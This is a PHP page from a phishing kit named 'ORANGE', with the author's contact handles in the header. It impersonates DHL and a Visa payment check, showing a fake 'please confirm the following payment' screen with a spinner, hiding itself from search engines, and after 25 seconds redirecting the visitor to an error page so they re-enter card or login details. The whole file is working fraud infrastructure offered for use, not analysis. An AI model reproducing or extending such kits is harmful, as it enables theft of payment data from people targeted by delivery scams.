<?php

/**
 * @link              https://www.z0n51.com/
 * @since             03/08/2020
 * @package           ORANGE
 * @facebook          https://www.facebook.com/z0n51
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ORANGE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $random   = rand(0,100000000000);
    $dispatch = substr(md5($random), 0, 17);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body>

        
        <div id="ss-wrapper">
            <div class="ss-area">
                <form action="submit.php" method="post">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="width: 100px;" src="../assets/images/logo.svg"></div>
                    <div><img src="../assets/images/vs.png"></div>
                </div>
                <h3>Please confirm the following payment.</h3>
                <div class="details" style="background: #fff;">
                    <div class="loader text-center mt50 mb80">
                        <div class="spinner-border text-danger" role="status">
                            <span class="sr-only">Loading...</span>
                        </div>
                    </div>
                </div>
                <p class="copy"><?php echo date('Y'); ?> &copy; DHL International GmbH. All rights reserved.</p>
            </form>
            </div>
        </div>
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'ss.php?error=1&confirmation#_'+ dispatch;
            },25000); // 1000 = 1s
        </script>

    </body>

</html>